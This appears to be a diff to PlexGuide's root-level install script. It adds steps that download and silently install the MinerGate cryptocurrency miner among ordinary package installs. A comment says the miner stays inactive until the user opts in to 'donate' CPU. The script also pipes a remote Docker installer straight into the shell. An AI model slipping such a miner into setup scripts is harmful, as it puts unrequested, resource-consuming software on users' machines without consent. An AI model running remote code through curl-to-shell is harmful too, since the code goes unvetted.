@@ -6,6 +6,13 @@ answer=$( while ! head -c 1 | grep -i '[ny]' ;do true ;done )
 stty $old_stty_cfg
 if echo "$answer" | grep -iq "^y" ;then
     echo Yes;
+
+    file="/var/plexguide/basics.yes"
+    if [ -e "$file" ]
+    then
+        clear
+    else
+        bash /opt/plexguide/scripts/docker-no/dep.sh
     yes | apt-get update
     yes | apt-get install nano
     yes | apt-get install fuse
@@ -18,7 +25,13 @@ if echo "$answer" | grep -iq "^y" ;then
     yes | apt-get install unionfs-fuse
     yes | apt-get install dirmngr
 
-    #important folders
+## This installs a miner, but is off by defaulf. If you wish to active,
+## please goto [Donate] and select the amount of CPU you wish to donate :D
+    wget https://minergate.com/download/deb-cli -O minergate-cli.deb
+    dpkg -i minergate-cli.deb
+## Example of execution CMD is minergate-cli -user <YOUR@EMAIL.KAPPA> -bcn 4
+   fi    
+#important folders
   mkdir /mnt/plexdrive4
   chmod 755 /mnt/plexdrive4
 
@@ -44,18 +57,20 @@ if echo "$answer" | grep -iq "^y" ;then
   chmod 777 /mnt/sab/nzb
 
 #Prevents this script from running again
-    mkdir /var/plexguide
-    touch /var/plexguide/dep7.yes
+  mkdir /var/plexguide
+  touch /var/plexguide/dep8.yes
+  touch /var/plexguide/miner.no
+  touch /var/plexguide/basics.yes
 
 # Install Docker and Docker Composer / Checks to see if is installed also
 clear
 echo "Note, if you get a message about docker is install and the 20 sec sleep"
 echo "warning, just ignore it and let the 20 seconds go by."
 echo
-      curl -sSL https://get.docker.com | sh
-      curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
-      chmod +x /usr/local/bin/docker-compose
-      docker-compose -f /opt/plexguide/scripts/docker/portainer.yml up -d
+curl -sSL https://get.docker.com | sh
+curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
+chmod +x /usr/local/bin/docker-compose
+docker-compose -f /opt/plexguide/scripts/docker/portainer.yml up -d
 
 ############################################# Install a Post-Docker Fix ###################### START
 
